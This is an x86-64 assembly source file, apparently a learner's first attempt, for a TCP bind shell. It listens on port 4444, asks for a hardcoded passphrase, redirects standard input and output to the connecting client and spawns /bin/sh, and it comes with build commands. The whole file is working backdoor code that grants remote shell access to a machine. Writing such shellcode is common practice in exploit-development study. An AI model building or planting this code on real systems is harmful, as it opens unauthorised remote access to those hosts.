; A verbose and lengthy first attempt at a TCP Bind Shell
; Build with: nasm -felf64 bind_shell.nasm -o tmp.o && ld tmp.o -o bind_shell

global _start
section .text

_start:
    mov rbp, rsp
    jmp short _strdata  ; Find address of string list

_getref:                ; Keep reference to strings
    pop r15
    jmp short _main

_strdata:
    call _getref        ; call pushes RIP onto stack
    prompt: db "Speak friend and enter: "
    pass:   db "password"
    good:   db "Welcome", 0xa
    bad:    db "Wrong", 0xa

_exit:      ; exit nicely
    xor rax, rax
    push rax
    pop rbx
    add rax, 0x3c
    add rbx, 1
    mov rsp, rbp
    syscall 

_prompt:    ; send string to a socket, RSI and RDX populated before call    
    mov rdi, [rbp-40]
    xor rax, rax    
    mov r10, rax        ; Zero unused params
    mov r8, rax
    mov r9, rax 
    add rax, 44         ; sys_sendto
    syscall
    ret

_main:      
; Build a server sockaddr_in struct on the stack
    xor rax, rax
    push rax
    add ax, 0x5c11
    shl rax, 16
    add ax, 2
    push rax

; Create Socket 
    xor rax, rax
    mov rdx, rax
    inc rax
    mov rsi, rax        ; SOCK_STREAM (1)
    inc rax
    mov rdi, rax        ; AF_INET (2)
    add rax, 39         ; syscall 41
    syscall
    cmp rax, -1
    jle _exit
    push rax            ; store socket id on stack

; Bind Socket
    xor rax, rax
    add rax, 49
    mov rdi, [rbp-24]   ; socket id
    lea rsi, [rbp-16]   ; sockaddr_in struct
    xor rdx, rdx
    add rdx, 16         ; sockaddr_in size
    push rdx            ; create size val ref on stack
    syscall
    cmp rax, -1
    jle _exit

; Listen
    xor rax, rax
    add rax, 2
    mov rsi, rax
    add rax, 48
    syscall
    cmp rax, -1
    jle _exit

_accept:
    xor rax, rax
    add rax, 43
    mov rdi, [rbp-24]   ; socket id
    lea rsi, [rbp-16]   ; sockaddr_in struct
    lea rdx, [rbp-32]   ; pointer to sockaddr_in size
    syscall
    cmp rax, -1
    jle _exit

    push rax            ; Store client socket id

; authenticate incoming connection
    mov rsi, r15        ; string address
    xor rdx, rdx
    add rdx, 24         ; string length
    call _prompt

    mov rdi, [rbp-40]   ; socket id
    lea rsi, [rbp-16]   ; buffer address
    xor rax, rax        ; Zero out registers
    push rax
    push rax
    pop rdx
    pop r10
    mov r8, rax
    mov r9, rax 
    add rdx, 8          ; buffer length
    add rax, 45         ; recvfrom
    syscall

; compare strings
    lea rsi, [rbp-16]   ; input buffer address
    lea rdi, [r15+24]   ; password string address
    xor rcx, rcx
    add rcx, 8          ; length

_cmploop:
    cmpsb               ; compare bytes
    jne _badpw          ; exit if no match
    loop _cmploop       ; next char

; good passphrase (fallthrough)
    lea rsi, [r15+32]   ; welcome string
    xor rdx, rdx
    add rdx, 8          ; welcome length
    call _prompt
    jmp _create_shell   ; set up the shell

_badpw:
    lea rsi, [r15+40]   ; fail message
    xor rdx, rdx
    add rdx, 6          ; fail length
    call _prompt
    xor rax, rax        ; zero out regs
    push rax
    pop rsi
    add rax, 48         ; shutdown client socket
    pop rdi             ; last use of client sock id
    add rsi, 2          ; SHUT_RDWR
    syscall     
    jmp _accept         ; jump back to await another connection

_create_shell:
; Duplicate I/O descriptors
    xor rax, rax 
    add rax, 33     ; dup2      
    mov r8, rax
    mov rdi, [rbp-40]   ; client socket id
    xor rsi, rsi        ; STDIN
    syscall 

    mov rax, r8         ; dup2
    inc rsi             ; STDOUT
    syscall

    mov rax, r8         ; dup2
    inc rsi             ; STDERR
    syscall

_spawn:
    xor rax, rax
    push rax
    pop rdx             ; less instructions than MOV
    mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
    shr rbx, 8          ; shift the ¨X¨ and append a NULL
    mov [rbp-16], rbx   ; copy ¨/bin/sh¨ string to buffer
    lea rdi, [rbp-16]   ; get the /bin/sh string
    push rax            ; build args array, by pushing NULL
    push rdi            ; then pushing string address
    mov rsi, rsp        ; args array address
    add rax, 59         ; execve
    syscall
    call _exit
